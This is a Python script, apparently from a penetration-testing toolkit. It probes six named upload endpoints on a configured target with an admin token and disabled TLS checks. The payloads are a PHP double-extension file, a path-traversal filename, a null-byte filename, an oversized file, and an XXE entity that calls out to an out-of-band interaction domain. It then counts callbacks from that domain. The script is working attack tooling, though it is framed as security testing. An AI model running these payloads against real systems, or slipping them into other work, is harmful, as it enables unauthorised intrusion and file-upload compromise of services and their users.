"""V8 P1 覆盖补齐：上传深度测试（内容/扩展名/路径穿越/大文件/XXE）。
只读探测 + OAST；不写入业务数据；结束后检查/清理自有测试文件。
"""
import sys as _sys
from pathlib import Path as _Path
_sys.path.insert(0, str(_Path(__file__).resolve().parents[1]))
from runner import public_config as _pub
import json
import os
import time
import random
import requests
import urllib3
urllib3.disable_warnings()
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BASE = _pub.target()
TOK = os.path.join(ROOT, 'evidence', 'tokens', 'admin02.txt')
OUT = os.path.join(ROOT, 'reports', 'final', 'upload_matrix.json')
PNG = bytes.fromhex('89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a49444154789c6360000002000154a24f5f0000000049454e44ae426082')
ENDPOINTS = ['/basis/v1/userInfo/importUser', '/serv/v1/recording/img/upload', '/serv/v1/terminal/excel', '/serv/v1/terminal/import', '/serv/v1/terminal/import/model', '/serv/v1/terminal/log/upload']

def token():
    return open(TOK, encoding='utf-8').read().strip() if os.path.exists(TOK) else ''

def post_file(path, field, filename, content, ctype):
    h = {'Origin': BASE, 'Referer': BASE + '/ui/login', 'User-Agent': 'Mozilla/5.0', 'token': token()}
    r = requests.post(BASE + path, headers=h, params={'t': str(int(time.time() * 1000))}, files={field: (filename, content, ctype)}, timeout=25, verify=False)
    try:
        j = r.json()
    except Exception:
        j = {'raw': r.text[:200]}
    return {'http': r.status_code, 'code': j.get('code'), 'msg': j.get('msg'), 'body': json.dumps(j, ensure_ascii=False)[:250]}

def main():
    oast = json.load(open(os.path.join(ROOT, 'adapters', 'oast', 'oast_state.json'), encoding='utf-8'))
    domain = oast['domain']
    xxe_tok = 'uplxxe-' + str(random.randint(100000, 999999))
    xml = f'<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "http://{xxe_tok}.{domain}/x">]><f>&x;</f>'
    big = b'0' * (2 * 1024 * 1024)
    variants = [('ok.png', PNG, 'image/png'), ('evil.png.php', PNG, 'image/png'), ('../../../../tmp/secauto_upl.txt', PNG, 'image/png'), ('test.xlsx%00.png', PNG, 'image/png'), ('big.xlsx', big, 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'), ('xxe.xml', xml.encode(), 'application/xml')]
    res = {'generated_at': time.strftime('%Y-%m-%dT%H:%M:%S'), 'results': [], 'oast_token': xxe_tok, 'oast_hits': 0}
    for path in ENDPOINTS:
        for (fn, content, ctype) in variants:
            r = post_file(path, 'file', fn, content, ctype)
            res['results'].append({'path': path, 'filename': fn, 'size': len(content), **r})
            print(path, fn, '->', r.get('http'), r.get('code'))
    time.sleep(8)
    jsonl = os.path.join(ROOT, 'tools_cache', 'interactsh', 'interactions.jsonl')
    if os.path.exists(jsonl):
        for line in open(jsonl, encoding='utf-8', errors='replace'):
            if xxe_tok in line:
                res['oast_hits'] += 1
    json.dump(res, open(OUT, 'w', encoding='utf-8'), ensure_ascii=False, indent=1)
    print('oast_hits:', res['oast_hits'], '->', OUT)
if __name__ == '__main__':
    main()
